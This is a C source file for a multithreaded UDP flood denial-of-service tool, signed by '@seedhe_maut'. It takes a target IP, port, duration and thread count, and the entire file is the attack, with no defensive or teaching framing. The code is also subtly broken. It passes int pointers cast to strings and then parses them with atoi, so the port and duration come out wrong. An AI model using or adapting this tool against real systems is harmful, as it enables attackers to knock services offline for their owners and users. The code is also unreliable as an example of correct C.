#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>

#define PACKET_SIZE 1024  // Adjustable size of UDP packets

volatile int running = 1;

// Graceful exit on CTRL+C
void handle_signal(int signal) {
    running = 0;
}

// UDP Flood attack function
void *udp_flood(void *arg) {
    char **params = (char **)arg;
    char *target_ip = params[0];
    int target_port = atoi(params[1]);
    int duration = atoi(params[2]);

    struct sockaddr_in target;
    int sock;
    char packet[PACKET_SIZE];

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target.sin_addr);

    memset(packet, 'X', PACKET_SIZE); // Fill packet with arbitrary data

    time_t start_time = time(NULL);
    while (running && (time(NULL) - start_time < duration)) {
        if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
            perror("Socket error");
            continue;
        }

        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        close(sock);  // Close socket after sending to prevent exhaustion
    }

    return NULL;
}

// Function to start multiple attack threads
void start_attack(char *target_ip, int target_port, int duration, int threads) {
    pthread_t thread_pool[threads];
    char *params[] = {target_ip, (char *)&target_port, (char *)&duration};

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_pool[i], NULL, udp_flood, (void *)params) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Duration> <Threads>\n", argv[0]);
        printf("Made by @seedhe_maut\n");
        return 1;
    }

    signal(SIGINT, handle_signal);

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    printf("\n🔥 UDP Flood Attack 🔥\n");
    printf("Target: %s:%d\n", target_ip, target_port);
    printf("Duration: %d seconds | Threads: %d\n", duration, threads);
    printf("Made by @seedhe_maut\n\n");
    
    start_attack(target_ip, target_port, duration, threads);

    printf("Attack completed.\n");
    return 0;
}
